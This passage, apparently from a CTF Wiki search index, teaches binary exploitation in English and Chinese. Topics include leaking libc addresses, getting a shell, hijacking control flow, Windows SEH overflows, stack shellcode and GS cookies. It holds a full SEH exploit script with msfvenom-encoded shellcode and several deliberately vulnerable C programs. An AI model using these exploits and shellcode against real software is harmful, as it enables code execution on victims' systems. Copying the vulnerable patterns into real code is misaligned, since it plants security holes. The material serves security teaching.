emphasis here is on the idea that the offset between symbols is fixed.</p>"},{"location":"pwn/linux/summary/get-address/#stack-related","title":"Stack Related","text":"<p>Regarding the address on the stack, in fact, most of the time we do not need a specific stack address, but we can guess the position of a variable on the stack relative to the EBP according to the addressing mode of the stack.</p>"},{"location":"pwn/linux/summary/get-address/#glibc-related","title":"Glibc Related","text":"<p>The main consideration here is how to find related functions in Glibc.</p>"},{"location":"pwn/linux/summary/get-address/#with-libc","title":"With libc","text":"<p>At this time we need to consider using the same function as the base address of the function in libc. For example, we can leak the base address of libc in memory by the address of __libc_start_main.</p> <p>**Note: Do not select a function with wapper, which will make the base address of the function incorrectly calculated. **</p> <p>What are the common wapper functions? (To be added).</p>"},{"location":"pwn/linux/summary/get-address/#without-libc","title":"Without libc","text":"<p>In fact, the solution strategy for this situation is divided into two types.</p> <ul> <li>Find a way to get libc</li> <li>Find a way to get the corresponding address directly.</li> </ul> <p>For the address that we want to leak, we simply need the corresponding content, so puts, write, printf can be.</p> <ul> <li>puts, printf will have \\x00 truncation problem</li> <li>write can specify the length of the output.</li> </ul> <p>Here are some corresponding methods</p>"},{"location":"pwn/linux/summary/get-address/#pwnlibdynelf","title":"<code>pwnlib.dynelf</code>","text":"<p>The premise is that we can divulge the contents of any address.</p> <ul> <li>** If you want to use the write function to leak, it is better to output some address content at a time, because we generally just continuously read the content to the high address, it is likely to cause the high address environment variable to be overwritten, which will lead to the shell. Can not start. **</li> </ul>"},{"location":"pwn/linux/summary/get-address/#libc-database","title":"libc database","text":"<pre><code>#Update database\n./get\n\n# Add existing libc to the database\n./add libc.so \n\n# Find all the libc's in the database that have the given names at the given addresses. \n\n./find function1 addr function2 addr\n\n# Dump some useful offsets, given a libc ID. You can also provide your own names to dump.\n\n./dump __libc_start_main_ret system dup2\n</code></pre> <p>Go to the libc database and find the corresponding libc with the same address that already appears. This is probably the same.</p> <p>You can also use the following online website:</p> <ul> <li>[libcdb.com] (http://libcdb.com)</li> <li>libc.blukat.me</li> </ul> <p>** Of course, there are also https://github.com/lieanu/LibcSearcher mentioned above. **</p>"},{"location":"pwn/linux/summary/get-address/#heap-related","title":"Heap related","text":"<p>Regarding the speculation of some addresses of the heap, this requires us to know in more detail how much memory is allocated in the heap, which block of the memory address is currently leaked, and then obtain the base address of the heap, and the relevant memory address in the heap.</p>"},{"location":"pwn/linux/summary/get-address/#guess-the-address","title":"Guess the address","text":"<p>In some strange cases, we may be able to use the following</p> <ul> <li>Use some violent methods to get the address, such as 32-bit, the address randomization space is relatively small.</li> <li>When a program is specially deployed, the location where its different libraries are loaded may be special. We can try it locally and guess the situation at the remote.</li> </ul>"},{"location":"pwn/linux/summary/get-shell/","title":"shell Get a summary","text":""},{"location":"pwn/linux/summary/get-shell/#overview","title":"overview","text":"<p>The shell we get is generally in two forms.</p> <ul> <li>Directly interactive shell</li> <li>Bind the shell to the specified port of the specified ip</li> </ul> <p>Here are a few common ways to get a shell.</p>"},{"location":"pwn/linux/summary/get-shell/#shellcode","title":"shellcode","text":"<p>When using shellcode to get a shell, the basic requirement is that we can place the shellcode in a ** writable executable memory area**. Therefore, when there is no memory area to write executable, we need to use the function <code>mprotect</code> to set the permissions of the relevant memory.</p> <p>In addition, sometimes the characters in the shellcode must meet certain requirements, such as printable characters, letters, numbers, and so on.</p>"},{"location":"pwn/linux/summary/get-shell/#system","title":"system","text":"<p>We usually execute functions such as system(\"/bin/sh\"), system('sh').</p> <p>Here we mainly need to find some addresses, you can refer to the section for obtaining the address.</p> <ul> <li>the address of system</li> <li>\"/bin/sh\", \"sh\" address</li> <li>binary is a string inside</li> <li>Consider personal reading the corresponding string</li> <li>libc actually has /bin/sh</li> </ul> <p>When you get the shell in system, a very good advantage is that we only need to arrange one parameter. The disadvantage is that when we lay out the parameters, we may not be able to execute because the environment variables are destroyed.</p>"},{"location":"pwn/linux/summary/get-shell/#execve","title":"execve","text":"<p>Execute execve(\"/bin/sh\", NULL, NULL).</p> <p>When using <code>execve</code> to get a shell, the first few are consistent with system. But it has the advantage of being almost immune to environmental variables. But the downside is that we need to arrange three parameters.</p> <p>In addition, we can also use one_gadget to get the shell in glibc.</p>"},{"location":"pwn/linux/summary/get-shell/#syscall","title":"syscall","text":"<p>The system call number <code>__NR_execve</code> is 11 in IA-32 and 59 in x86-64.</p> <p>Its advantage is that it is almost immune to environmental variables. However, we need to find a system call command like <code>syscall</code>.</p>"},{"location":"pwn/linux/summary/hijack-control-flow/","title":"Control program execution flow","text":"<p>In the process of controlling the execution flow of the program, we can consider the following ways.</p>"},{"location":"pwn/linux/summary/hijack-control-flow/#direct-control-eip","title":"Direct control EIP","text":""},{"location":"pwn/linux/summary/hijack-control-flow/#return-address","title":"return address","text":"<p>That is, control the return address on the program stack.</p>"},{"location":"pwn/linux/summary/hijack-control-flow/#jump-pointer","title":"Jump pointer","text":"<p>Here we can consider the following way</p> <ul> <li> <p>call </p> </li> <li> <p>jmp</p> </li> </ul>"},{"location":"pwn/linux/summary/hijack-control-flow/#function-pointer","title":"function pointer","text":"<p>Common function pointers have</p> <ul> <li> <p>vtable,  function table\uff0c\u5982 IO_FILE \u7684 vtable\uff0cprintf function table\u3002</p> </li> <li> <p>hook pointers, such as <code>malloc_hook</code>, <code>free_hook</code>.</p> </li> <li>acting</li> </ul>"},{"location":"pwn/linux/summary/hijack-control-flow/#modify-control-flow-related-variables","title":"Modify control flow related variables","text":""},{"location":"pwn/windows/readme/","title":"Overview","text":"<p>Briefly describe exploits under Windows.</p>"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/","title":"SEH Exploits","text":""},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#instruction","title":"Instruction","text":"<p>\u7ed3\u6784\u5316\u5f02\u5e38\u5904\u7406\uff08SEH\uff09\u662f\u4e00\u79cd Windows \u673a\u5236\uff0c\u7528\u4e8e\u4e00\u81f4\u5730\u5904\u7406\u786c\u4ef6\u548c\u8f6f\u4ef6\u5f02\u5e38\u3002\u8be5\u7ed3\u6784\u901a\u5e38\u8868\u793a\u4e3a try / except\u6216try / catch \u4ee3\u7801\u5757\u3002 <pre><code>__try {\n    // the block of code to try (aka the \"guarded body\")\n    ...\n}\n__except (exception filter) {\n    // the code to run in the event of an exception (aka the \"exception handler)\n    ...\n}\n</code></pre> \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u53ef\u4ee5\u7531\u5e94\u7528\u7a0b\u5e8f\uff08\u901a\u8fc7\u4e0a\u8ff0 __try / __ except \u6784\u9020\uff09\u6216\u7531\u64cd\u4f5c\u7cfb\u7edf\u672c\u8eab\u5b9e\u73b0\u3002\u7531\u4e8e\u9519\u8bef\u7684\u7c7b\u578b\u5f88\u591a\uff08\u9664\u96f6\uff0c\u8d85\u51fa\u8303\u56f4\u7b49\uff09\uff0c\u56e0\u6b64\u53ef\u4ee5\u6709\u8bb8\u591a\u76f8\u5e94\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002</p> <p>\u4e0d\u8bba\u5728\u4f55\u5904\u5b9a\u4e49\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff08\u5e94\u7528\u7a0b\u5e8f\u4e0e\u64cd\u4f5c\u7cfb\u7edf\uff09\uff0c\u8fd8\u662f\u8bbe\u8ba1\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u7c7b\u578b\uff0c\u6240\u6709\u5904\u7406\u7a0b\u5e8f\u5747\u7531 Windows SEH \u901a\u8fc7\u6307\u5b9a\u6570\u636e\u7ed3\u6784\u548c\u51fd\u6570\u7684\u96c6\u5408\u8fdb\u884c\u96c6\u4e2d\u7edf\u4e00\u7ba1\u7406\u3002</p>"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#seh","title":"SEH\u7684\u4e3b\u8981\u7ec4\u6210\u90e8\u5206","text":"<p>\u5bf9\u4e8e\u6bcf\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u90fd\u6709\u4e00\u4e2a Exception Registration Record \u7ed3\u6784\uff0c\u5982\u4e0b\u6240\u793a\uff1a <pre><code>typedef struct _EXCEPTION_REGISTRATION_RECORD { \n    struct _EXCEPTION_REGISTRATION_RECORD *Next; \n    PEXCEPTION_ROUTINE Handler; \n} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;\n</code></pre> \u8fd9\u4e9b Exception Registration Record \u4f7f\u7528\u94fe\u8868\u7684\u7ed3\u6784\u8fde\u63a5\u5728\u4e00\u8d77 \u3002\u5176\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bb5\uff08Next\uff09\u662f\u6307\u5411SEH\u94fe\u4e2d\u4e0b\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u53ef\u4ee5\u4f7f\u7528 Next \u4ece\u4e0a\u5230\u4e0b\u6d4f\u89c8 SEH \u94fe\u3002\u7b2c\u4e8c\u4e2a\u5b57\u6bb5\uff08Handler\uff09\u662f\u6307\u5411\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7684\u6307\u9488\uff0c\u8be5\u51fd\u6570\u5982\u4e0b\u6240\u793a\uff1a <pre><code>EXCEPTION_DISPOSITION \n__cdecl _except_handler(\n    struct _EXCEPTION_RECORD *ExceptionRecord,\n    oid EstablisherFrame,\n    struct _CONTEXT *ContextRecord,\n    void * DispatcherContext\n);\n</code></pre> \u7b2c\u4e00\u4e2a\u51fd\u6570\u53c2\u6570\u662f\u6307\u5411 _EXCEPTION_RECORD \u7ed3\u6784\u7684\u6307\u9488\u3002\u8be5\u7ed3\u6784\u5305\u542b\u6709\u5173\u7ed9\u5b9a\u5f02\u5e38\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5f02\u5e38\u4ee3\u7801\uff0c\u5f02\u5e38\u5730\u5740\u548c\u53c2\u6570\u6570\u91cf\u3002</p> <p>_except_handler \u51fd\u6570\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4ee5\u786e\u5b9a\u5f02\u5e38\u662f\u5426\u53ef\u4ee5\u7531\u5f53\u524d\u5f02\u5e38\u5904\u7406\u51fd\u6570\u5904\u7406\uff0c\u6216\u8005\u5b83\u9700\u8981\u79fb\u4ea4\u5230\u4e0b\u4e00\u4e2a Exception Registration Record \u8fdb\u884c\u5904\u7406\u3002 </p>"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#seh_1","title":"\u5229\u7528SEH","text":"<p>\u5728 SEH \u4e0b\uff0c\u76f4\u63a5\u8986\u76d6 SEH_Handler \u5b57\u6bb5\uff0c\u7136\u540e\u89e6\u53d1\u5f02\u5e38\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u6d4b\u8bd5\u7a0b\u5e8f\u4ee3\u7801\uff08\u4f7f\u7528VS2017\u547d\u4ee4\u884c\u7f16\u8bd1\uff09\uff1a <pre><code>// cl SEH_Chain.c /GS- /DYNAMICBASE:NO /link /FIXED\nint vul()\n{\n    char s[0x20] = {0};\n    __try\n    {\n        scanf(\"%s\",s);\n    }\n    __except(EXCEPTION_EXECUTE_HANDLER)\n    {\n        puts(\"GG\");\n    }        \n    return 0;\n}\n\nint main(int argc, char **argv)\n{\n    puts(\"Welcome!\");\n    vul();\n    return 0;\n}\n</code></pre> \u672a\u4fee\u6539\u7684SEH\u94fe\uff1a <pre><code>\u5730\u5740       \u5f02\u5e38\u5904\u7406\u4f8b\u7a0b   \u6a21\u5757/\u6807\u7b7e     \u6ce8\u91ca\n0019FF60    00401E10    seh_chain \n0019FFCC    77A79F80    ntdll     \n0019FFE4    77A88F07    ntdll     \n</code></pre> \u6808\u7a7a\u95f4\uff1a <pre><code>0019FF60  0019FFCC  \u6307\u5411SEH_Record[1]\u7684\u6307\u9488\n0019FF64  00401E10  seh_chain.00401E10\n0019FF68  E1C62A0A  \n0019FF6C  00000000  \n0019FF70  0019FF80  \n0019FF74  76036359  \u8fd4\u56de\u5230 kernel32.76036359 \u81ea ???\n0019FF78  00379000  \n0019FF7C  76036340  kernel32.76036340\n0019FF80  0019FFDC  \n0019FF84  77A67B74  \u8fd4\u56de\u5230 ntdll.77A67B74 \u81ea ???\n0019FF88  00379000  \n0019FF8C  E03A396D  \n0019FF90  00000000  \n0019FF94  00000000  \n0019FF98  00379000  \n0019FF9C  00000000  \n0019FFA0  00000000  \n0019FFA4  00000000  \n0019FFA8  00000000  \n0019FFAC  00000000  \n0019FFB0  00000000  \n0019FFB4  00000000  \n0019FFB8  00000000  \n0019FFBC  00000000  \n0019FFC0  00000000  \n0019FFC4  0019FF8C  \n0019FFC8  00000000  \n0019FFCC  0019FFE4  \u6307\u5411SEH_Record[2]\u7684\u6307\u9488\n0019FFD0  77A79F80  ntdll.77A79F80\n</code></pre> \u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230SEH\u94fe\u7684\u5b58\u5728\u3002scanf\u8986\u76d6\u4e4b\u540e\u7684SEH\u94fe\uff1a <pre><code>\u5730\u5740       \u5f02\u5e38\u5904\u7406\u4f8b\u7a0b   \u6a21\u5757/\u6807\u7b7e \u6ce8\u91ca\n0019FF10    42424242  \n42424242    00000000  \n</code></pre> \u5904\u7406\u4f8b\u7a0b\u548c\u4e0b\u4e2aSEH\u7ed3\u6784\u7684\u4f4d\u7f6e\u90fd\u5df2\u7ecf\u88ab\u4fee\u6539\u3002\u5c1d\u8bd5\u8f93\u5165\u5927\u91cf\u6570\u636e\u4ee5\u89e6\u53d1\u5f02\u5e38\uff1a <pre><code>python -c \"print 'A'*0x28 + 'B'*8 + 'A'*0x200\"\n</code></pre> \u89e6\u53d1\u5f02\u5e38\u540e\u7684\u5bc4\u5b58\u5668\uff1a <pre><code>EAX : 00000000\nEBX : 00000000\nECX : 42424242\nEDX : 77A88DC0     ntdll.77A88DC0\nEBP : 0019F0D8\nESP : 0019F0B8\nESI : 00000000\nEDI : 00000000\nEIP : 42424242\nEFLAGS : 00010246\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0cEIP\u5df2\u7ecf\u88ab\u63a7\u5236\u5230\u4e86\u8f93\u5165\u7684 BBBB(42424242) \u5904\uff0c\u4ece\u800c\u63a7\u5236\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002</p>"},{"location":"pwn/windows/stackoverflow/SEH-Exploits/#seh_2","title":"SEH\u7684\u5e38\u7528\u5229\u7528\u65b9\u5f0f","text":"<p>attachment here</p> <p>EIP\u88ab\u63a7\u5236\u540e\u7684\u6808\u7a7a\u95f4\uff1a <pre><code>0019F0B8  77A88DA2  \u8fd4\u56de\u5230 ntdll.77A88DA2 \u81ea ???\n0019F0BC  0019F1B8  \n0019F0C0  0019FF10  \"BBBBBBBBAAAAAAAAAAAAAAAAA... \"\n0019F0C4  0019F208  \n0019F0C8  0019F144  &amp;\"BBBBBBBBAAAAAAAAAAAAAAAA... \"\n0019F0CC  0019F6FC  \u6307\u5411SEH_Record[1]\u7684\u6307\u9488\n0019F0D0  77A88DC0  ntdll.77A88DC0\n0019F0D4  0019FF10  \"BBBBBBBBAAAAAAAAAAAAAAAAA...\"\n0019F0D8  0019F1A0  \n</code></pre> \u53ef\u4ee5\u770b\u5230 ESP+0x8 \u5904\u7684\u5730\u5740\u6b63\u597d\u6307\u5411\u89e6\u53d1\u5f02\u5e38\u7684 SEH \u7684\u7ed3\u6784\u5904\uff0c\u5f53\u7a0b\u5e8f\u672a\u5f00\u542f DEP \u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7 POP+POP+RET \u7684\u65b9\u5f0f\uff0c\u6267\u884c\u5230 ShellCode \u4e0a\u3002\u5bfb\u627e\u4e00\u4e2a gadget\uff1a\uff08x32dbg -&gt;\u53f3\u51fb-&gt;\u641c\u7d22-&gt;\u6240\u6709\u6a21\u5757-&gt;\u547d\u4ee4\uff0c\u6216\u8005\u5176\u4ed6\u65b9\u6cd5\u5bfb\u627e\uff09 <pre><code>0040292A | 5E | pop esi |\n0040292B | 5B | pop ebx |\n0040292C | C3 | ret     |\n</code></pre> \u7f16\u5199\u4e00\u4e2aEXP\uff1a <pre><code>from pwintools import *\nimport struct\n\ndef p32(addr):\n    return struct.pack(\"&lt;I\",addr)\n\npop_pop_ret = 0x0040136F\n\np = Process(\"./SEH_Chain_VC6.exe\")\n\n# msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b '\\x09\\x0a\\x0b\\x0c\\x0d\\x1a\\x20' -f python\nbuf =  \"\"\nbuf += \"\\xb8\\xb6\\xc7\\xe5\\xf9\\xda\\xdb\\xd9\\x74\\x24\\xf4\\x5d\\x29\"\nbuf += \"\\xc9\\xb1\\x31\\x83\\xed\\xfc\\x31\\x45\\x0f\\x03\\x45\\xb9\\x25\"\nbuf += \"\\x10\\x05\\x2d\\x2b\\xdb\\xf6\\xad\\x4c\\x55\\x13\\x9c\\x4c\\x01\"\nbuf += \"\\x57\\x8e\\x7c\\x41\\x35\\x22\\xf6\\x07\\xae\\xb1\\x7a\\x80\\xc1\"\nbuf += \"\\x72\\x30\\xf6\\xec\\x83\\x69\\xca\\x6f\\x07\\x70\\x1f\\x50\\x36\"\nbuf += \"\\xbb\\x52\\x91\\x7f\\xa6\\x9f\\xc3\\x28\\xac\\x32\\xf4\\x5d\\xf8\"\nbuf += \"\\x8e\\x7f\\x2d\\xec\\x96\\x9c\\xe5\\x0f\\xb6\\x32\\x7e\\x56\\x18\"\nbuf += \"\\xb4\\x53\\xe2\\x11\\xae\\xb0\\xcf\\xe8\\x45\\x02\\xbb\\xea\\x8f\"\nbuf += \"\\x5b\\x44\\x40\\xee\\x54\\xb7\\x98\\x36\\x52\\x28\\xef\\x4e\\xa1\"\nbuf += \"\\xd5\\xe8\\x94\\xd8\\x01\\x7c\\x0f\\x7a\\xc1\\x26\\xeb\\x7b\\x06\"\nbuf += \"\\xb0\\x78\\x77\\xe3\\xb6\\x27\\x9b\\xf2\\x1b\\x5c\\xa7\\x7f\\x9a\"\nbuf += \"\\xb3\\x2e\\x3b\\xb9\\x17\\x6b\\x9f\\xa0\\x0e\\xd1\\x4e\\xdc\\x51\"\nbuf += \"\\xba\\x2f\\x78\\x19\\x56\\x3b\\xf1\\x40\\x3c\\xba\\x87\\xfe\\x72\"\nbuf += \"\\xbc\\x97\\x00\\x22\\xd5\\xa6\\x8b\\xad\\xa2\\x36\\x5e\\x8a\\x5d\"\nbuf += \"\\x7d\\xc3\\xba\\xf5\\xd8\\x91\\xff\\x9b\\xda\\x4f\\xc3\\xa5\\x58\"\nbuf += \"\\x7a\\xbb\\x51\\x40\\x0f\\xbe\\x1e\\xc6\\xe3\\xb2\\x0f\\xa3\\x03\"\nbuf += \"\\x61\\x2f\\xe6\\x67\\xe4\\xa3\\x6a\\x46\\x83\\x43\\x08\\x96\"\n\npayload = \"\"\npayload += \"\\x90\"*0x28\npayload += \"\\xEB\\x14\\x90\\x90\" # asm(\"jmp $+22\")\npayload += p32(pop_pop_ret)\npayload += \"\\x90\"*0x20\npayload += buf\npayload = payload.ljust(0x200,\"\\x90\")\n\nraw_input()\np.sendline(payload)\nraw_input()\n</code></pre> \u6267\u884cexp\u540e\uff0c\u5c06\u4f1a\u5f39\u51fa\u4e00\u4e2a\u8ba1\u7b97\u5668\u3002</p>"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/","title":"Execute Shellcode","text":""},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#introduction","title":"Introduction","text":"<p>A shellcode is a piece of code that is executed to exploit a software vulnerability. The shellcode is a hexadecimal mechanical code, named after the attacker often gets the shell. Shellcode is often written in machine language. After the scratchpad eip overflows, it inserts a shellcode mechanical code that the CPU can execute, allowing the computer to execute any command from the attacker. The ASLR, NX, and CANARY options are turned off at compile time, so that the shellcode can be placed on the stack at the time of input. The dynamic padding can be used to obtain the required padding overflow to the shellcode address of the input address, so that the shellcode will be executed after the program returns. .</p> <p></p>"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#example","title":"example","text":"<p>A classic example is given below. After the program overflows, the shellcode is executed. The compiled environment is vc6.0 for the winxp tool.</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;windows.h&gt;\n\n\n\n#define PASSWORD \"1234567\"\n\n\n\nint verify_password(char *password)\n\n{\n\n    int authenticated;\n\n    char buffer[50];\n\n    authenticated = strcmp(password,PASSWORD);\n\n    memcpy(buffer,password,strlen(password)); \n\n    return authenticated;\n\n}\n\n\n\nvoid main()\n\n{\n\n    int valid_flag =0;\n\nchar password [1024];\n    FILE *fp;\n\n\n\n    LoadLibrary(\"user32.dll\");\n\n\n\n    if (!(fp=fopen(\"password.txt\",\"rw+\")))\n\n    {\n\n        exit(0);\n\n    }\n\n    fscanf(fp,\"%s\",password);\n\n\n\n    valid_flag = verify_password(password);\n\n\n\n    if (valid_flag !=0)\n\n    {\n\n        printf(\"incorrect password!\\n\\n\");\n\n    }\n\n    else\n\n    {\n\n        printf(\"Congratulation! You have passed the verification!\\n\");\n\n    }\n\n    fclose(fp);\n\n    getchar();\n\n}\n</code></pre> <p>After compiling, drag into OllyDbg dynamic debugging to determine the length of padding, and the next breakpoint at memcpy for subsequent debugging. You can make a 50 BYTES padding comparison distance from the return address, and finally determine the return address after 60 BYTES.</p> <p></p> <p>The entered string will be copied to the location of the 0012FAE4 on the stack.</p> <p></p> <p>Because the return address is controlled to 0012FAE4 by reasonable padding, the value of the register EIP is 0012FAE4 when the function returns. At this time, the system considers the data in the stack as machine code, the program. The code with the address 0012FAE4 will be executed.</p> <p></p> <p>The content in password.txt is a well-arranged machine code. The function is to pop up a message box with hackhack. How to write the contents of password.txt, we will focus on the entire implementation process in the following chapters.</p> <p>As expected, the pop-up function was performed after the program returned.</p> <p></p>"},{"location":"pwn/windows/stackoverflow/shellcode-in-stack/#reference-reading","title":"Reference reading","text":"<p>[0day security: software vulnerability analysis technology] ()</p> <p>cve-2015-8277</p>"},{"location":"pwn/windows/stackoverflow/stack-introduce/","title":"\u6808\u4ecb\u7ecd \u00b6","text":"<p>[You can refer to this article] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/)</p>"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/","title":"stackoverflow GS","text":""},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#introduction","title":"Introduction","text":"<p>\u6b63\u5982Linux\u4e2d\u5b58\u5728\u6808\u6ea2\u51fa\u7684\u9632\u62a4\u673a\u5236 Canary \u4e00\u6837\uff0cwindows \u4e2d\u4e5f\u5b58\u5728\u7c7b\u4f3c\u7684\u673a\u5236\u3002\u4e0e Canary \u7684\u601d\u60f3\u4e00\u81f4\uff0cGS \u4e5f\u662f\u5728\u6808\u4e2d\u63d2\u5165\u4e00\u4e2a\u503c\uff0c\u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4b GS \u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8\uff0c\u4ee5\u6b64\u6765\u5224\u65ad stack/buffer overflow \u662f\u5426\u53d1\u751f\u3002</p>"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#gs","title":"GS \u539f\u7406","text":"<p>\u4f7f\u7528Visual Studio\u7f16\u8bd1\u65f6\uff0c\u3001GS\u9ed8\u8ba4\u4e3a\u6253\u5f00\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u5728\u6253\u5f00\u9879\u76ee\u7684\u201d\u5c5e\u6027\u9875\u201c\u4e2d\u4fee\u6539\u3002</p>"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#gs_1","title":"\u5728/ GS\u7f16\u8bd1\u5668\u9009\u9879\u4fdd\u62a4\u4e0b\u5217\u9879\u76ee\uff1a","text":"<pre><code>\u51fd\u6570\u8c03\u7528\u7684\u8fd4\u56de\u5730\u5740\u3002\n\u51fd\u6570\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u5730\u5740\u3002\n\u8106\u5f31\u7684\u529f\u80fd\u53c2\u6570\u3002\n</code></pre>"},{"location":"pwn/windows/stackoverflow/stackoverflow-GS/#gs_2","title":"GS \u5b9e\u73b0\u539f\u7406","text":"<p>\u5f00\u542f GS \u4fdd\u62a4\u7684 stack \u7ed3\u6784\u5927\u6982\u5982\u4e0b\uff1a <pre><code>        Low\n        Address |  Local Variable |\n                +-----------------+\n      rbp-8 =&gt;  |    GS_Cookie    |\n                +-----------------+\n        rbp =&gt;  |     old ebp     |\n                +-----------------+\n                | return address  |\n                +-----------------+\n                |      args       |\n                +-----------------+\n        High    |                 | \n        Address\n</code></pre> \u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86 GS \u4fdd\u62a4\u65f6\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u5c06 securitycookie \u4e0e ebp \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u7136\u540e\u5b58\u653e\u5728 ebp-0x1C \u7684\u4f4d\u7f6e <pre><code>mov     eax, ___security_cookie\nxor     eax, ebp\nmov     [ebp - 0x1C], eax\n</code></pre> \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u548c ebp \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\u540e\uff0c\u4e0e _security_cookie \u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u3002 <pre><code>mov     ecx, [ebp+var_1C]\nxor     ecx, ebp\ncall    j_@__security_check_cookie@4 ; __security_check_cookie(x)\n------------------------------------------------------------------\n; __fastcall __security_check_cookie(x)\n@__security_check_cookie@4 proc near\n        cmp     ecx, ___security_cookie\n        bnd jnz short loc_4086E5\n        bnd retn\nloc_4086E5:\n        bnd jmp sub_4010B9\n</code></pre> \u5982\u679c GS_Cookie \u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230\u629b\u51fa\u5f02\u5e38\u5e76\u9000\u51fa\u7684\u6d41\u7a0b\u3002 <pre><code>push    offset ExceptionInfo ; ExceptionInfo\ncall    sub_401A87\n</code></pre> \u5176\u4e2d ___security_cookie \u662f\u5b58\u653e\u5728 .data \u6bb5\u4e0a\u7684\u6570\u636e\uff0c <pre><code>.data:0047C004 ___security_cookie dd 0BB40E64Eh\n</code></pre> \u5176\u6bcf\u6b21\u8fd0\u884c\u90fd\u4f1a\u91cd\u65b0\u8d4b\u503c\u4e3a\u65b0\u7684\u503c <pre><code>void sub_409366()\n{\n  int v0; // ecx\n  unsigned int v1; // eax\n\n  v0 = __security_cookie;\n  if ( __security_cookie == 0xBB40E64E || !(__security_cookie &amp; 0xFFFF0000) )\n  {\n    v1 = sub_409306();\n    v0 = v1;\n    if ( v1 == 0xBB40E64E )\n    {\n      v0 = 0xBB40E64F;\n    }\n    else if ( !(v1 &amp; 0xFFFF0000) )\n    {\n      v0 = ((v1 | 0x4711) &lt;&lt; 16) | v1;\n    }\n    __security_cookie = v0;\n  }\n  dword_47C000 = ~v0;\n}\n\nunsigned int sub_409306()\n{\n  LARGE_INTEGER PerformanceCount; // [esp+0h] [ebp-14h]\n  struct _FILETIME SystemTimeAsFileTime; // [esp+8h] [ebp-Ch]\n  DWORD v3; // [esp+10h] [ebp-4h]\n\n  SystemTimeAsFileTime.dwLowDateTime = 0;\n  SystemTimeAsFileTime.dwHighDateTime = 0;\n  GetSystemTimeAsFileTime(&amp;SystemTimeAsFileTime);\n  v3 = SystemTimeAsFileTime.dwLowDateTime ^ SystemTimeAsFileTime.dwHighDateTime;\n  v3 ^= GetCurrentThreadId();\n  v3 ^= GetCurrentProcessId();\n  QueryPerformanceCounter(&amp;PerformanceCount);\n  return (unsigned int)&amp;v3 ^ v3 ^ PerformanceCount.LowPart ^ PerformanceCount.HighPart;\n}\n</code></pre> \u4f46\u662f\u7531\u4e8e\u5176\u5b58\u50a8\u5728\u7a0b\u5e8f\u6bb5\u4e0a\uff0c\u6240\u4ee5\u6bd4\u8d77 Canary \u66f4\u5bb9\u6613\u8bfb\u53d6\u5229\u7528\u3002</p>"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/","title":"Stack overflow principle","text":""},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#introduction","title":"Introduction","text":"<p>For an introduction to the stack, read the introduction in [Linux Pwn] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/).</p>"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#basic-example","title":"Basic example","text":"<p>A typical example is given below, in which the last byte overflow occurs due to the order of the variable declarations and the size of the buffer declaration.</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define PASSWORD \"666666\"\n\nint verify_password(char *password)\n\n{\n\n    int authenticated;\n\n    char buffer[8];\n\n    authenticated = strcmp(password,PASSWORD);\n\n    strcpy(buffer,password); \n\n    return authenticated;\n\n}\n\nvoid main()\n\n{\n\n    int valid_flag =0;\n\nchar password [128];\n    while(1)\n\n    {\n\n        printf(\"please input password:  \");\n\n        scanf(\"%s\",password);\n\n        valid_flag = verify_password(password);\n\n        if (valid_flag !=0)\n\n        {\n\n            printf(\"incorrect password!\\n\");\n\n        }\n\n        else\n\n        {\n\n            printf(\"Congratulation! You have passed the verification!\\n\");\n\n            break;\n\n        }\n\n    }\n\n}\n</code></pre> <p>This is a simple password verification program that will determine if the input string is equal to 666666. Use vc6.0 to compile this program. After successful, use winchecksec to view the 